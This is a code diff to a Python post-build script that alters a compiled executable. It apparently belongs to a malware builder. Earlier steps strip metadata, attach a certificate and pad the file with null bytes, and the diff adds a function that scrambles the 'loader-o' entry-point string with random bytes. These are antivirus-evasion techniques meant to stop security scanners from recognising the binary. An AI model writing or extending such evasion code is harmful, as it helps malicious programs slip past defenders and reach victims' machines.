@@ -49,9 +49,20 @@ def PumpStub(path: str, pumpFile: str):
                     pumpedSize -= len(data)
                     file.seek(0)
                     file.write(data[:offset] + b"\x00" * pumpedSize + data[offset:])
-
     except Exception:
         pass
+
+def RenameEntryPoint(path: str, entryPoint: str):
+    print("Renaming Entry Point")
+    with open(path, "rb") as file:
+        data = file.read()
+
+    entryPoint = entryPoint.encode()
+    new_entryPoint = b'\x00' + os.urandom(len(entryPoint) - 1)
+    data = data.replace(entryPoint, new_entryPoint)
+
+    with open(path, "wb") as file:
+        file.write(data)
 
 if __name__ == "__main__":
     builtFile = os.path.join("dist", "Built.exe")
@@ -59,5 +70,6 @@ if __name__ == "__main__":
         RemoveMetaData(builtFile)
         AddCertificate(builtFile)
         PumpStub(builtFile, "pumpStub")
+        RenameEntryPoint(builtFile, "loader-o")
     else:
         print("Not Found")
